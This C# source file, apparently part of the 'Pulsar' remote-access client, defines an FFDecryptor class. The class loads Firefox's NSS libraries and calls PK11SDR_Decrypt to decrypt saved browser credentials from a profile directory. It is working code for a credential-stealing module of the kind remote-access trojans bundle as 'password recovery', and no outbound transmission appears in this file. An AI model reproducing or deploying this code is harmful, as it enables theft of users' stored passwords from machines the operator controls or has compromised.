using Pulsar.Client.Utilities;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Firefox credentials.
    /// </summary>
    public class FFDecryptor : IDisposable
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit NSS_Init;

        private NssShutdown NSS_Shutdown;

        private Pk11sdrDecrypt PK11SDR_Decrypt;

        private IntPtr NSS3;
        private IntPtr Mozglue;
        public bool IsInitialized { get; private set; }
        public string LastError { get; private set; }

        public long Init(string configDirectory)
        {
            try
            {
                string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
                Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
                NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
                if (Mozglue == IntPtr.Zero || NSS3 == IntPtr.Zero)
                {
                    LastError = "Mozilla NSS libraries are unavailable.";
                    return -1;
                }

                IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
                IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
                IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
                if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
                {
                    LastError = "Required Mozilla NSS exports are unavailable.";
                    return -1;
                }

                NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
                PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
                NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
                long result = NSS_Init(configDirectory);
                IsInitialized = result == 0;
                if (!IsInitialized)
                    LastError = "Mozilla NSS initialization failed.";
                return result;
            }
            catch (Exception ex)
            {
                LastError = ex.GetType().Name;
                return -1;
            }
        }

        public string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(cypherText);

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                }
            }

            return null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (IsInitialized && NSS_Shutdown != null)
                {
                    try { NSS_Shutdown(); } catch { }
                }
                if (NSS3 != IntPtr.Zero)
                    NativeMethods.FreeLibrary(NSS3);
                if (Mozglue != IntPtr.Zero)
                    NativeMethods.FreeLibrary(Mozglue);
            }
        }
    }
}
